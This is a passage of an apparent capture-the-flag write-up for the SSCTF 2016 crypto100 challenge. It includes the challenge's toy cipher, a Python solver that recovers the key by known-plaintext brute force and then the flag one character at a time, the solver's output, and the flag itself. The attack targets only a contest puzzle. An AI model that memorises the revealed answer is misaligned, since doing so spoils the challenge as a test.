<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span></div><div class="code"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(plain, key)</span>:</span>
  plain = bytearray(plain)
  key = bytearray(key)
  <span class="hljs-keyword">assert</span> len(key) == <span class="hljs-number">8</span>
  t1 = bytearray()
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> plain:
      t1.append(A[i])
  t2 = bytearray()
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t1)):
      t2.append(LShift(t1[i], B[i % <span class="hljs-number">8</span>]))
  <span class="hljs-keyword">for</span> times <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] = C[t2[i]]
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] = LShift(t2[i], i ^ D[i % <span class="hljs-number">8</span>])
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] ^= key[i % <span class="hljs-number">8</span>]
  out = <span class="hljs-string">""</span>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t2:
      out += encode(i)
  <span class="hljs-keyword">return</span> out
</div></div></code></pre><p>(A, C is permute, B, D is array)<br>
and, <code>encrypt("asdfghjk123456", key)</code>, <code>encrypt(flag, key)</code> is known.</p><p>variable <code>t1</code> is deterministic from <code>plain</code>. non-deterministic variable is only <code>key</code>.</p><p>This algorithm encrypts it every one character. so, I try bruteforce key using Known-Plaintext.</p><p>solver code is here:</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span>
<span data-linenumber="67"></span>
<span data-linenumber="68"></span>
<span data-linenumber="69"></span>
<span data-linenumber="70"></span>
<span data-linenumber="71"></span>
<span data-linenumber="72"></span>
<span data-linenumber="73"></span>
<span data-linenumber="74"></span>
<span data-linenumber="75"></span>
<span data-linenumber="76"></span>
<span data-linenumber="77"></span>
<span data-linenumber="78"></span>
<span data-linenumber="79"></span>
<span data-linenumber="80"></span>
<span data-linenumber="81"></span>
<span data-linenumber="82"></span>
<span data-linenumber="83"></span>
<span data-linenumber="84"></span>
<span data-linenumber="85"></span>
<span data-linenumber="86"></span>
<span data-linenumber="87"></span>
<span data-linenumber="88"></span>
<span data-linenumber="89"></span>
<span data-linenumber="90"></span>
<span data-linenumber="91"></span>
<span data-linenumber="92"></span>
<span data-linenumber="93"></span>
<span data-linenumber="94"></span>
<span data-linenumber="95"></span>
<span data-linenumber="96"></span>
<span data-linenumber="97"></span>
<span data-linenumber="98"></span>
<span data-linenumber="99"></span>
<span data-linenumber="100"></span>
<span data-linenumber="101"></span></div><div class="code"><span class="hljs-keyword">from</span> scryptos <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LShift</span><span class="hljs-params">(t, k)</span>:</span>
    k %= <span class="hljs-number">8</span>
    <span class="hljs-keyword">return</span> ((t &lt;&lt; k) | (t &gt;&gt; (<span class="hljs-number">8</span> - k))) &amp; <span class="hljs-number">0xff</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(p)</span>:</span>
    ret = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
        <span class="hljs-comment">#ret = ('|' if (p &gt;&gt; i) &amp; 1 else 'O') + ret</span>
        ret = (<span class="hljs-string">'1'</span> <span class="hljs-keyword">if</span> (p &gt;&gt; i) &amp; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'0'</span>) + ret
    <span class="hljs-keyword">return</span> ret


A = [<span class="hljs-number">85</span>, <span class="hljs-number">128</span>, <span class="hljs-number">177</span>, <span class="hljs-number">163</span>, <span class="hljs-number">7</span>, <span class="hljs-number">242</span>, <span class="hljs-number">231</span>, <span class="hljs-number">69</span>, <span class="hljs-number">185</span>, <span class="hljs-number">1</span>, <span class="hljs-number">91</span>, <span class="hljs-number">89</span>, <span class="hljs-number">80</span>, <span class="hljs-number">156</span>, <span class="hljs-number">81</span>, <span class="hljs-number">9</span>, <span class="hljs-number">102</span>, <span class="hljs-number">221</span>, <span class="hljs-number">195</span>, <span class="hljs-number">33</span>, <span class="hljs-number">31</span>, <span class="hljs-number">131</span>, <span class="hljs-number">179</span>, <span class="hljs-number">246</span>, <span class="hljs-number">15</span>, <span class="hljs-number">139</span>, <span class="hljs-number">205</span>, <span class="hljs-number">49</span>, <span class="hljs-number">107</span>, <span class="hljs-number">193</span>, <span class="hljs-number">5</span>, <span class="hljs-number">63</span>, <span class="hljs-number">117</span>, <span class="hljs-number">74</span>, <span class="hljs-number">140</span>, <span class="hljs-number">29</span>, <span class="hljs-number">135</span>, <span class="hljs-number">43</span>, <span class="hljs-number">197</span>, <span class="hljs-number">212</span>, <span class="hljs-number">0</span>, <span class="hljs-number">189</span>, <span class="hljs-number">218</span>, <span class="hljs-number">190</span>, <span class="hljs-number">112</span>, <span class="hljs-number">83</span>, <span class="hljs-number">238</span>, <span class="hljs-number">47</span>, <span class="hljs-number">194</span>, <span class="hljs-number">68</span>, <span class="hljs-number">233</span>, <span class="hljs-number">67</span>, <span class="hljs-number">122</span>, <span class="hljs-number">138</span>, <span class="hljs-number">53</span>, <span class="hljs-number">14</span>, <span class="hljs-number">35</span>, <span class="hljs-number">76</span>, <span class="hljs-number">79</span>, <span class="hljs-number">162</span>, <span class="hljs-number">145</span>, <span class="hljs-number">51</span>, <span class="hljs-number">90</span>, <span class="hljs-number">234</span>, <span class="hljs-number">50</span>, <span class="hljs-number">6</span>, <span class="hljs-number">225</span>, <span class="hljs-number">250</span>, <span class="hljs-number">215</span>, <span class="hljs-number">133</span>, <span class="hljs-number">180</span>, <span class="hljs-number">97</span>, <span class="hljs-number">141</span>, <span class="hljs-number">96</span>, <span class="hljs-number">20</span>, <span class="hljs-number">226</span>, <span class="hljs-number">3</span>, <span class="hljs-number">191</span>, <span class="hljs-number">187</span>, <span class="hljs-number">57</span>, <span class="hljs-number">168</span>, <span class="hljs-number">171</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">196</span>, <span class="hljs-number">71</span>, <span class="hljs-number">239</span>, <span class="hljs-number">200</span>, <span class="hljs-number">254</span>, <span class="hljs-number">175</span>, <span class="hljs-number">164</span>, <span class="hljs-number">203</span>, <span class="hljs-number">61</span>, <span class="hljs-number">16</span>, <span class="hljs-number">241</span>, <span class="hljs-number">40</span>, <span class="hljs-number">176</span>, <span class="hljs-number">59</span>, <span class="hljs-number">70</span>, <span class="hljs-number">169</span>, <span class="hljs-number">146</span>, <span class="hljs-number">247</span>, <span class="hljs-number">232</span>, <span class="hljs-number">152</span>, <span class="hljs-number">165</span>, <span class="hljs-number">62</span>, <span class="hljs-number">253</span>, <span class="hljs-number">166</span>, <span class="hljs-number">167</span>, <span class="hljs-number">182</span>, <span class="hljs-number">160</span>, <span class="hljs-number">125</span>, <span class="hljs-number">78</span>, <span class="hljs-number">28</span>, <span class="hljs-number">130</span>, <span class="hljs-number">159</span>, <span class="hljs-number">255</span>, <span class="hljs-number">124</span>, <span class="hljs-number">153</span>, <span class="hljs-number">56</span>, <span class="hljs-number">58</span>, <span class="hljs-number">143</span>, <span class="hljs-number">150</span>, <span class="hljs-number">111</span>, <span class="hljs-number">207</span>, <span class="hljs-number">206</span>, <span class="hljs-number">32</span>, <span class="hljs-number">144</span>,
     <span class="hljs-number">75</span>, <span class="hljs-number">39</span>, <span class="hljs-number">10</span>, <span class="hljs-number">201</span>, <span class="hljs-number">204</span>, <span class="hljs-number">77</span>, <span class="hljs-number">104</span>, <span class="hljs-number">65</span>, <span class="hljs-number">219</span>, <span class="hljs-number">98</span>, <span class="hljs-number">210</span>, <span class="hljs-number">173</span>, <span class="hljs-number">249</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">21</span>, <span class="hljs-number">115</span>, <span class="hljs-number">48</span>, <span class="hljs-number">157</span>, <span class="hljs-number">147</span>, <span class="hljs-number">11</span>, <span class="hljs-number">99</span>, <span class="hljs-number">227</span>, <span class="hljs-number">45</span>, <span class="hljs-number">202</span>, <span class="hljs-number">158</span>, <span class="hljs-number">213</span>, <span class="hljs-number">100</span>, <span class="hljs-number">244</span>, <span class="hljs-number">54</span>, <span class="hljs-number">17</span>, <span class="hljs-number">161</span>, <span class="hljs-number">123</span>, <span class="hljs-number">92</span>, <span class="hljs-number">181</span>, <span class="hljs-number">243</span>, <span class="hljs-number">184</span>, <span class="hljs-number">188</span>, <span class="hljs-number">84</span>, <span class="hljs-number">95</span>, <span class="hljs-number">27</span>, <span class="hljs-number">72</span>, <span class="hljs-number">106</span>, <span class="hljs-number">192</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>, <span class="hljs-number">129</span>, <span class="hljs-number">208</span>, <span class="hljs-number">109</span>, <span class="hljs-number">26</span>, <span class="hljs-number">24</span>, <span class="hljs-number">223</span>, <span class="hljs-number">64</span>, <span class="hljs-number">114</span>, <span class="hljs-number">19</span>, <span class="hljs-number">198</span>, <span class="hljs-number">23</span>, <span class="hljs-number">82</span>, <span class="hljs-number">120</span>, <span class="hljs-number">142</span>, <span class="hljs-number">178</span>, <span class="hljs-number">214</span>, <span class="hljs-number">186</span>, <span class="hljs-number">116</span>, <span class="hljs-number">94</span>, <span class="hljs-number">222</span>, <span class="hljs-number">86</span>, <span class="hljs-number">251</span>, <span class="hljs-number">36</span>, <span class="hljs-number">4</span>, <span class="hljs-number">248</span>, <span class="hljs-number">132</span>, <span class="hljs-number">25</span>, <span class="hljs-number">211</span>, <span class="hljs-number">199</span>, <span class="hljs-number">30</span>, <span class="hljs-number">87</span>, <span class="hljs-number">60</span>, <span class="hljs-number">127</span>, <span class="hljs-number">155</span>, <span class="hljs-number">41</span>, <span class="hljs-number">224</span>, <span class="hljs-number">151</span>, <span class="hljs-number">237</span>, <span class="hljs-number">136</span>, <span class="hljs-number">245</span>, <span class="hljs-number">37</span>, <span class="hljs-number">170</span>, <span class="hljs-number">252</span>, <span class="hljs-number">8</span>, <span class="hljs-number">42</span>, <span class="hljs-number">209</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">88</span>, <span class="hljs-number">183</span>, <span class="hljs-number">149</span>, <span class="hljs-number">110</span>, <span class="hljs-number">66</span>, <span class="hljs-number">235</span>, <span class="hljs-number">229</span>, <span class="hljs-number">134</span>, <span class="hljs-number">73</span>, <span class="hljs-number">38</span>, <span class="hljs-number">118</span>, <span class="hljs-number">236</span>, <span class="hljs-number">119</span>, <span class="hljs-number">154</span>, <span class="hljs-number">216</span>, <span class="hljs-number">217</span>, <span class="hljs-number">240</span>, <span class="hljs-number">22</span>, <span class="hljs-number">121</span>, <span class="hljs-number">174</span>, <span class="hljs-number">93</span>, <span class="hljs-number">126</span>, <span class="hljs-number">230</span>, <span class="hljs-number">228</span>, <span class="hljs-number">18</span>, <span class="hljs-number">148</span>, <span class="hljs-number">220</span>, <span class="hljs-number">172</span>, <span class="hljs-number">2</span>, <span class="hljs-number">137</span>, <span class="hljs-number">34</span>]
B = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>]
C = [<span class="hljs-number">179</span>, <span class="hljs-number">132</span>, <span class="hljs-number">74</span>, <span class="hljs-number">60</span>, <span class="hljs-number">94</span>, <span class="hljs-number">252</span>, <span class="hljs-number">166</span>, <span class="hljs-number">242</span>, <span class="hljs-number">208</span>, <span class="hljs-number">217</span>, <span class="hljs-number">117</span>, <span class="hljs-number">255</span>, <span class="hljs-number">20</span>, <span class="hljs-number">99</span>, <span class="hljs-number">225</span>, <span class="hljs-number">58</span>, <span class="hljs-number">54</span>, <span class="hljs-number">184</span>, <span class="hljs-number">243</span>, <span class="hljs-number">37</span>, <span class="hljs-number">96</span>, <span class="hljs-number">106</span>, <span class="hljs-number">64</span>, <span class="hljs-number">151</span>, <span class="hljs-number">148</span>, <span class="hljs-number">248</span>, <span class="hljs-number">44</span>, <span class="hljs-number">175</span>, <span class="hljs-number">152</span>, <span class="hljs-number">40</span>, <span class="hljs-number">171</span>, <span class="hljs-number">251</span>, <span class="hljs-number">210</span>, <span class="hljs-number">118</span>, <span class="hljs-number">56</span>, <span class="hljs-number">6</span>, <span class="hljs-number">138</span>, <span class="hljs-number">77</span>, <span class="hljs-number">45</span>, <span class="hljs-number">169</span>, <span class="hljs-number">209</span>, <span class="hljs-number">232</span>, <span class="hljs-number">68</span>, <span class="hljs-number">182</span>, <span class="hljs-number">91</span>, <span class="hljs-number">203</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">172</span>, <span class="hljs-number">95</span>, <span class="hljs-number">154</span>, <span class="hljs-number">90</span>, <span class="hljs-number">164</span>, <span class="hljs-number">161</span>, <span class="hljs-number">231</span>, <span class="hljs-number">11</span>, <span class="hljs-number">21</span>, <span class="hljs-number">3</span>, <span class="hljs-number">97</span>, <span class="hljs-number">70</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">124</span>, <span class="hljs-number">114</span>, <span class="hljs-number">119</span>, <span class="hljs-number">223</span>, <span class="hljs-number">123</span>, <span class="hljs-number">167</span>, <span class="hljs-number">47</span>, <span class="hljs-number">219</span>, <span class="hljs-number">197</span>, <span class="hljs-number">221</span>, <span class="hljs-number">193</span>, <span class="hljs-number">192</span>, <span class="hljs-number">126</span>, <span class="hljs-number">78</span>, <span class="hljs-number">39</span>, <span class="hljs-number">233</span>, <span class="hljs-number">4</span>, <span class="hljs-number">120</span>, <span class="hljs-number">33</span>, <span class="hljs-number">131</span>, <span class="hljs-number">145</span>, <span class="hljs-number">183</span>, <span class="hljs-number">143</span>, <span class="hljs-number">31</span>, <span class="hljs-number">76</span>, <span class="hljs-number">121</span>, <span class="hljs-number">92</span>, <span class="hljs-number">153</span>, <span class="hljs-number">85</span>, <span class="hljs-number">100</span>, <span class="hljs-number">52</span>, <span class="hljs-number">109</span>, <span class="hljs-number">159</span>, <span class="hljs-number">112</span>, <span class="hljs-number">71</span>, <span class="hljs-number">62</span>, <span class="hljs-number">8</span>, <span class="hljs-number">244</span>, <span class="hljs-number">116</span>, <span class="hljs-number">245</span>, <span class="hljs-number">240</span>, <span class="hljs-number">215</span>, <span class="hljs-number">111</span>, <span class="hljs-number">134</span>, <span class="hljs-number">199</span>, <span class="hljs-number">214</span>, <span class="hljs-number">196</span>, <span class="hljs-number">213</span>, <span class="hljs-number">180</span>, <span class="hljs-number">189</span>, <span class="hljs-number">224</span>, <span class="hljs-number">101</span>, <span class="hljs-number">202</span>, <span class="hljs-number">201</span>, <span class="hljs-number">168</span>, <span class="hljs-number">32</span>, <span class="hljs-number">250</span>, <span class="hljs-number">59</span>, <span class="hljs-number">43</span>, <span class="hljs-number">27</span>, <span class="hljs-number">198</span>, <span class="hljs-number">239</span>, <span class="hljs-number">137</span>, <span class="hljs-number">238</span>, <span class="hljs-number">50</span>,
     <span class="hljs-number">149</span>, <span class="hljs-number">107</span>, <span class="hljs-number">247</span>, <span class="hljs-number">7</span>, <span class="hljs-number">220</span>, <span class="hljs-number">246</span>, <span class="hljs-number">204</span>, <span class="hljs-number">127</span>, <span class="hljs-number">83</span>, <span class="hljs-number">146</span>, <span class="hljs-number">147</span>, <span class="hljs-number">48</span>, <span class="hljs-number">17</span>, <span class="hljs-number">67</span>, <span class="hljs-number">23</span>, <span class="hljs-number">93</span>, <span class="hljs-number">115</span>, <span class="hljs-number">41</span>, <span class="hljs-number">191</span>, <span class="hljs-number">2</span>, <span class="hljs-number">227</span>, <span class="hljs-number">87</span>, <span class="hljs-number">173</span>, <span class="hljs-number">108</span>, <span class="hljs-number">82</span>, <span class="hljs-number">205</span>, <span class="hljs-number">49</span>, <span class="hljs-number">1</span>, <span class="hljs-number">66</span>, <span class="hljs-number">105</span>, <span class="hljs-number">176</span>, <span class="hljs-number">22</span>, <span class="hljs-number">236</span>, <span class="hljs-number">29</span>, <span class="hljs-number">170</span>, <span class="hljs-number">110</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">185</span>, <span class="hljs-number">235</span>, <span class="hljs-number">61</span>, <span class="hljs-number">88</span>, <span class="hljs-number">13</span>, <span class="hljs-number">165</span>, <span class="hljs-number">188</span>, <span class="hljs-number">177</span>, <span class="hljs-number">230</span>, <span class="hljs-number">130</span>, <span class="hljs-number">253</span>, <span class="hljs-number">150</span>, <span class="hljs-number">211</span>, <span class="hljs-number">42</span>, <span class="hljs-number">129</span>, <span class="hljs-number">125</span>, <span class="hljs-number">141</span>, <span class="hljs-number">19</span>, <span class="hljs-number">190</span>, <span class="hljs-number">133</span>, <span class="hljs-number">53</span>, <span class="hljs-number">84</span>, <span class="hljs-number">140</span>, <span class="hljs-number">135</span>, <span class="hljs-number">10</span>, <span class="hljs-number">241</span>, <span class="hljs-number">222</span>, <span class="hljs-number">73</span>, <span class="hljs-number">12</span>, <span class="hljs-number">155</span>, <span class="hljs-number">57</span>, <span class="hljs-number">237</span>, <span class="hljs-number">181</span>, <span class="hljs-number">36</span>, <span class="hljs-number">72</span>, <span class="hljs-number">174</span>, <span class="hljs-number">207</span>, <span class="hljs-number">98</span>, <span class="hljs-number">5</span>, <span class="hljs-number">229</span>, <span class="hljs-number">254</span>, <span class="hljs-number">156</span>, <span class="hljs-number">178</span>, <span class="hljs-number">128</span>, <span class="hljs-number">55</span>, <span class="hljs-number">14</span>, <span class="hljs-number">69</span>, <span class="hljs-number">30</span>, <span class="hljs-number">194</span>, <span class="hljs-number">122</span>, <span class="hljs-number">46</span>, <span class="hljs-number">136</span>, <span class="hljs-number">160</span>, <span class="hljs-number">206</span>, <span class="hljs-number">26</span>, <span class="hljs-number">102</span>, <span class="hljs-number">218</span>, <span class="hljs-number">103</span>, <span class="hljs-number">139</span>, <span class="hljs-number">195</span>, <span class="hljs-number">0</span>, <span class="hljs-number">144</span>, <span class="hljs-number">186</span>, <span class="hljs-number">249</span>, <span class="hljs-number">79</span>, <span class="hljs-number">81</span>, <span class="hljs-number">75</span>, <span class="hljs-number">212</span>, <span class="hljs-number">234</span>, <span class="hljs-number">158</span>, <span class="hljs-number">163</span>, <span class="hljs-number">80</span>, <span class="hljs-number">226</span>, <span class="hljs-number">65</span>, <span class="hljs-number">200</span>, <span class="hljs-number">38</span>, <span class="hljs-number">187</span>, <span class="hljs-number">113</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">142</span>, <span class="hljs-number">51</span>, <span class="hljs-number">228</span>, <span class="hljs-number">35</span>, <span class="hljs-number">157</span>, <span class="hljs-number">216</span>, <span class="hljs-number">104</span>, <span class="hljs-number">162</span>, <span class="hljs-number">15</span>, <span class="hljs-number">89</span>]
D = [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(plain, key)</span>:</span>
  <span class="hljs-comment">#plain = bytearray("asdfghjk123456")</span>
  <span class="hljs-comment">#key = bytearray()</span>
  plain = bytearray(plain)
  key = bytearray(key)
  <span class="hljs-keyword">assert</span> len(key) == <span class="hljs-number">8</span>
  t1 = bytearray()
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> plain:
      t1.append(A[i])
  t2 = bytearray()
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t1)):
      t2.append(LShift(t1[i], B[i % <span class="hljs-number">8</span>]))
  <span class="hljs-keyword">for</span> times <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] = C[t2[i]]
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] = LShift(t2[i], i ^ D[i % <span class="hljs-number">8</span>])
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t2)):
          t2[i] ^= key[i % <span class="hljs-number">8</span>]
  out = <span class="hljs-string">""</span>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t2:
      out += encode(i)
  <span class="hljs-comment">#print out</span>
  <span class="hljs-keyword">return</span> out

<span class="hljs-comment"># encrypt("asdfghjk123456", key)</span>
ct = [<span class="hljs-string">'00100110'</span>, <span class="hljs-string">'01111100'</span>, <span class="hljs-string">'10011011'</span>, <span class="hljs-string">'01011011'</span>, <span class="hljs-string">'10100000'</span>, <span class="hljs-string">'00101010'</span>, <span class="hljs-string">'11111001'</span>, <span class="hljs-string">'11011100'</span>, <span class="hljs-string">'11010000'</span>, <span class="hljs-string">'00101001'</span>, <span class="hljs-string">'00111100'</span>, <span class="hljs-string">'11100001'</span>, <span class="hljs-string">'11110111'</span>, <span class="hljs-string">'10100101'</span>, <span class="hljs-string">'01011001'</span>, <span class="hljs-string">'01101001'</span>, <span class="hljs-string">'01101110'</span>, <span class="hljs-string">'11010010'</span>, <span class="hljs-string">'00000110'</span>, <span class="hljs-string">'00101010'</span>, <span class="hljs-string">'11101001'</span>, <span class="hljs-string">'01011011'</span>, <span class="hljs-string">'01100000'</span>, <span class="hljs-string">'11100101'</span>]

<span class="hljs-comment"># key candidate 1</span>
candidates = [[] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>)]

<span class="hljs-comment"># brute force key</span>
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">256</span>):
    r = scytale.nth_split(encrypt(<span class="hljs-string">"asdfghjk123456"</span>, <span class="hljs-string">"\x00"</span> * l + chr(x) + <span class="hljs-string">"\x00"</span> * (<span class="hljs-number">7</span>-l)), <span class="hljs-number">8</span>)
    <span class="hljs-comment"># key check: using known-plaintext</span>
    <span class="hljs-keyword">if</span> r[l] == ct[l]:
      candidates[l] += [x]
  <span class="hljs-keyword">print</span> candidates

candidates_old = candidates
<span class="hljs-comment"># key candidate 2</span>
candidates = [[] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>)]
<span class="hljs-comment"># check key</span>
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> candidates_old[l]:
    <span class="hljs-keyword">if</span> l+<span class="hljs-number">8</span> &gt;= <span class="hljs-number">14</span>:
      candidates[l] += [x]
      <span class="hljs-keyword">continue</span>
    r = scytale.nth_split(encrypt(<span class="hljs-string">"asdfghjk123456"</span>, <span class="hljs-string">"\x00"</span> * l + chr(x) + <span class="hljs-string">"\x00"</span> * (<span class="hljs-number">7</span>-l)), <span class="hljs-number">8</span>)
    <span class="hljs-comment"># key check: +8 index</span>
    <span class="hljs-keyword">if</span> r[(l + <span class="hljs-number">8</span>) % len(r)] == ct[(l + <span class="hljs-number">8</span>) % len(ct)]:
      candidates[l] += [x]
  <span class="hljs-keyword">print</span> candidates

s = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
  <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> candidates[x]:
    <span class="hljs-keyword">if</span> <span class="hljs-number">0x20</span> &lt;=  c &lt;= <span class="hljs-number">0x7e</span>:
      s += chr(c)
      <span class="hljs-keyword">break</span>

<span class="hljs-keyword">print</span> repr(s)

<span class="hljs-keyword">print</span> scytale.nth_split(encrypt(<span class="hljs-string">"asdfghjk123456"</span>, s), <span class="hljs-number">8</span>)

<span class="hljs-comment"># decoded flag</span>
flag = <span class="hljs-string">'6\xb8~\xb8\xd0\xd4\xf8{&amp;\xd5\xf0+\x01\xb8d\xe9u!\x11\r&lt;\xf1Y\xect\x99\x85'</span>

key = s

ok = <span class="hljs-string">""</span>

<span class="hljs-comment"># brute force flag</span>
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> xrange(len(flag)):
  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tables.ascii_table:
    <span class="hljs-keyword">if</span> chr(int(scytale.nth_split(encrypt(ok + x + <span class="hljs-string">"\x00"</span> * (len(flag)-l), key), <span class="hljs-number">8</span>)[l], <span class="hljs-number">2</span>))== flag[l]:
      ok += x
      <span class="hljs-keyword">break</span>

<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] Flag is %s"</span> % ok
</div></div></code></pre><pre><code>Mon Feb 29 18:44:55 JST 2016 ~/ctf/ssctf-2016/crypto100 Battery 0: Full, 100%
&gt; python solve.py 
[[64, 94, 137], [], [], [], [], [], [], []]
[[64, 94, 137], [38, 78], [], [], [], [], [], []]
[[64, 94, 137], [38, 78], [35], [], [], [], [], []]
[[64, 94, 137], [38, 78], [35], [113], [], [], [], []]
[[64, 94, 137], [38, 78], [35], [113], [68, 243], [], [], []]
[[64, 94, 137], [38, 78], [35], [113], [68, 243], [57, 84, 153, 163], [], []]
[[64, 94, 137], [38, 78], [35], [113], [68, 243], [57, 84, 153, 163], [51, 245], []]
[[64, 94, 137], [38, 78], [35], [113], [68, 243], [57, 84, 153, 163], [51, 245], [0, 4, 95, 157, 163]]
[[94], [], [], [], [], [], [], []]
[[94], [38], [], [], [], [], [], []]
[[94], [38], [35], [], [], [], [], []]
[[94], [38], [35], [113], [], [], [], []]
[[94], [38], [35], [113], [68], [], [], []]
[[94], [38], [35], [113], [68], [57], [], []]
[[94], [38], [35], [113], [68], [57], [51, 245], []]
[[94], [38], [35], [113], [68], [57], [51, 245], [0, 4, 95, 157, 163]]
'^&amp;#qD93_'
['00100110', '01111100', '10011011', '01011011', '10100000', '00101010', '11111001', '11011100', '11010000', '00101001', '00111100', '11100001', '11110111', '10100101']
[+] Flag is SSCTF{1qaz9ol.nhy64rfv7ujm}
</code></pre><p>Flag: <code>1qaz9ol.nhy64rfv7ujm</code></p></div>
    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
        <div class="pull-right dropdown">
            <a id="tocLabel" class="ui-toc-label btn btn-default" data-target="#" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
                <i class="fa fa-bars"></i>
            </a>
            <ul id="toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
